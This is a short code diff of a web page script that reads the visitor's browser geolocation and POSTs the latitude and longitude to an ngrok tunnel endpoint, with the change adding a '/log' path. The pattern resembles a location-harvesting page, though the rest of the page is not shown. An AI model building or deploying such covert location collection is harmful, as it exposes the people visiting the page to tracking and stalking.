@@ -15,7 +15,7 @@
     const lat = position.coords.latitude;
     const lon = position.coords.longitude;
 
-    fetch("https://a15d26948c75.ngrok-free.app:5000", {
+    fetch("https://a15d26948c75.ngrok-free.app:5000/log", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ latitude: lat, longitude: lon })
@@ -25,5 +25,6 @@
 
 </body>
 </html>
+
 
 
